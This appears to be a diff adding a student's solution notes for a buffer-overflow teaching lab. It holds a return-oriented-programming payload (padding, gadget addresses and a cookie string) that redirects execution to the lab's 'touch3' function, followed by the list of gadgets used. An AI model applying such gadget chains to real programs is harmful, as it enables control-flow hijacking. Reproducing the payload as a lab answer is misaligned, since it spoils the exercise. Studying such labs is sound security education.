@@ -1,0 +1,64 @@
+BUFSIZE = 0x38
+touch3 at 0x401d9f
+GOAL:
+    %rdi -> 31 64 36 66 38 66 61 35 00,
+    call touch3
+
+--- PAD ---
+73 1f 40 00 00 00 00 00     # -> movq %rsp, %rax
+f5 1e 40 00 00 00 00 00     # -> movq %rax, %rdi    ; %rdi pointing here
+22 1f 40 00 00 00 00 00     # -> popq %rax
+48 00 00 00 00 00 00 00     # value: shift=72, %rax=shift
+14 20 40 00 00 00 00 00
+b4 1f 40 00 00 00 00 00
+7e 1f 40 00 00 00 00 00     # 402014 -> 401fb4 -> 401f7e <=> movl %eax, %esi
+52 1f 40 00 00 00 00 00     # -> lea (%rdi,%rsi,1), %rax ; %rax = %rdi + shift
+f5 1e 40 00 00 00 00 00     # -> movq %rax, %rdi
+9f 1d 40 00 00 00 00 00     # -> touch3
+31 64 36 66 38 66 61 35     # value: cookie string
+00
+
+
+
+401ef6:
+    movl %eax, %edi
+    ret
+
+401f22, 401f2d:
+    popq %rax
+    ret
+
+401f73:
+    movq %rsp, %rax
+    ret
+
+401ef5, 401f35:
+    movq %rax, %rdi
+    ret
+
+401f52:
+    lea (%rdi,%rsi,1), %rax
+    ret
+
+401f80, 401f15..8:
+    # nops
+    ret
+
+401f7e:
+    movl %ecx, %esi
+    # nops
+    ret
+
+401fb4:
+    movl %edx, %ecx
+    # nops
+    ret
+
+402014:
+    movl %eax, %edx
+    # nops
+    ret
+
+402014 -> 401fb4 -> 401f7e <=>
+    movl %eax, %esi
+    ret
